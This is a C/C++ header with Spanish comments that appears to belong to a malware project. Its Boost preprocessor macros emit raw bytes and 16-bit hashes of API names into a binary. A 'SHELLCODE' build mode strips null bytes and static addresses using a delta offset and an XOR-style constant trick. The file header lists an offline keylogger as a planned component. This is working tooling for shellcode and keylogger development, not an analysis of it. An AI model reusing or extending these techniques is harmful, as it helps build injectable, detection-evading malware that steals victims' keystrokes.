/*###############################################################################
** Macros:
**    En este fichero de encabezado estan definidos los macros preprocesador
**    encargados de:
**        *Crear e introducir hashes de las funciones en el fichero binario.
**        *Funciones para introducir BYTE/WORD/DWORD en el fichero binario.
**        *Función encargada de generar los identificadores que situan las
**            direcciones en el 'stack de direcciones'
**        *Compilación condicionada encargada de generar:
**            +Un shellcode libre de bytes nulos (TODO)
**            +Direcciones relativas que permitan la reubicación del código
**            +El Keylogger offline (TODO)
*###############################################################################*/

#include "preprocessor/seq/for_each_i.hpp"
#include "preprocessor/seq/fold_left.hpp"
#include "preprocessor/seq/size.hpp"
#include "preprocessor/cat.hpp"

/*###############################################################################
** Shellcode:
**    Si se define la compilación en modo 'shellcode' el código generado no tendrá
**    bytes nulos ni direcciones estáticas.
**    NOTA:{
**        Se añade código, como consecuencia aumenta el tamaño
**    }
*###############################################################################*/
#define SHELLCODE
#undef  SHELLCODE

/*###############################################################################
** HASH_AND_EMIT:
**    Macro que recibe una secuencia de bytes y genera el hash correspondiente.
**    El algoritmo que generá el hash es el siguiente:
**      def hash(s):
**          r = 0
**          for x in s:
**              r>>=1
**              r^=(ord(x)*ord(x))
**          return r
**    Después de generar el hash lo introduce en el binario.
**    El tamaño del hash es de 16 bits (1 WORD)
*###############################################################################*/
#define HASH_AND_EMIT(SEQ) EMIT_WORD(BOOST_PP_SEQ_FOLD_LEFT(CRYPT_BYTE, 0, SEQ))
#define CRYPT_BYTE(s, st, x) ((((st)>>1)^((x)*(x))))

/*###############################################################################
** HASH_* :
**    Macros que introducen en el binario diferentes datos
*###############################################################################*/
#define EMIT_BYTE_ARRAY(SEQ) BOOST_PP_SEQ_FOR_EACH_I(EMIT_BYTE_, 0, SEQ)
#define EMIT_BYTE_(r, d, i, e) __asm _emit ((e)&0xFF)
#define EMIT_BYTE(d) EMIT_BYTE_(0, 0, 0, d)
#define EMIT_WORD(d)\
    EMIT_BYTE(((d) >> 0))\
    EMIT_BYTE(((d) >> 8))
#define EMIT_DWORD(d)\
    EMIT_WORD(((d) >> 0))\
    EMIT_WORD(((d) >> 16))

/*###############################################################################
** CREATE_IDS:
**    Macro que recibe una lista de aliases.Calcula y almacena su posición en el 
**    stack de direcciones.
**    Además genera un ultimo alias llamado STACKSIZE con el tamaño total del 
**    stack utilizado.
**    NOTA:{
**        ¡¡¡LOS HASHES DEBEN DECLARSE EN EL MISMO ORDEN QUE LOS ALIASES!!!
**    }
*###############################################################################*/
#define CREATE_IDS(SEQ)\
    enum IDS{BOOST_PP_SEQ_FOR_EACH_I(ENUM_ITEM, 0, SEQ) STACKSIZE = (BOOST_PP_SEQ_SIZE(SEQ)*4)};
#define ENUM_ITEM(r, d, i, e) BOOST_PP_CAT(_, e) = ((i + 1)*4),

/*###############################################################################
** Macros de shellcode:
**    Conjunto de macros encargados de evitar direcciones estáticas y bytes nulos.
**    En caso de no estar activada la compilación 'SHELLCODE' estas características
**    quedan desactivadas.
*###############################################################################*/
#ifndef SHELLCODE
    #define pushr(addr)\
        pushc((addr))
    #define callr(addr)\
        call (addr)
    #define movr(r, addr)\
        mov (r), (addr)
    #define pushc(addr)\
        push (addr)
#else
    /*###############################################################################
    ** pushr:
    **    Macro que pushea en el stack una dirección y le suma la posición relativa o
    **    'Delta offset'
    **    NOTA{Se harcodean los opcodes para ahorrar el opcode de identificador de segmento}
    **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
    *###############################################################################*/
    #define pushr(addr)\
        __asm{pushc((addr))}\
        EMIT_BYTE_ARRAY((0x01) (0x3C) (0x24))
        //__asm{add DWORD PTR SS:[esp], edi}

    /*###############################################################################
    ** callr:
    **    Los calls relativos suelen tener bytes nulos, pera evitar esto hay que 
    **    modificar las direcciones restandoles una constante sin bytes nulos.
    **    NOTA{
    **        *La constante K puede necesitar ser cambiada para limpiar todos los
    **        bytes nulos de todas las direcciones relativas
    **        *Se utiliza EAX como registro ya que se da por echo que será cambiado
    **        por la función llamada (¡¡¡¡PELIGRO!!!!)
    **    }
    ** movr:
    **    Los movs de direcciones suelen tener bytes nulos, pera evitar esto hay que 
    **    modificar las direcciones restandoles una constante sin bytes nulos.
    **    NOTA{
    **        *La constante K puede necesitar ser cambiada para limpiar todos los
    **        bytes nulos de todas las direcciones relativas
    **    }
    *###############################################################################*/
    #define K 0xDEADBEEF
    #define callr(addr)\
        __asm{mov eax, ((addr)-K)}\
        __asm{add eax, (K)}\
        __asm{call eax}

    #define movr(r, addr)\
        __asm{mov (r), ((addr)-K)}\
        __asm{add (r), (K)}

    /*###############################################################################
    ** pushc:
    **    Macro que pushea en el stack una constante y eliminando los bytes nulos
    **    NOTA{Se harcodean los opcodes para ahorrar el opcode de identificador de segmento}
    **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
    *###############################################################################*/
    #define pushc(addr)\
        __asm{push ((addr)-K)}\
        EMIT_BYTE_ARRAY((0x81) (0x04) (0x24)) EMIT_DWORD(K)//__asm{add DWORD PTR SS:[esp], K}
#endif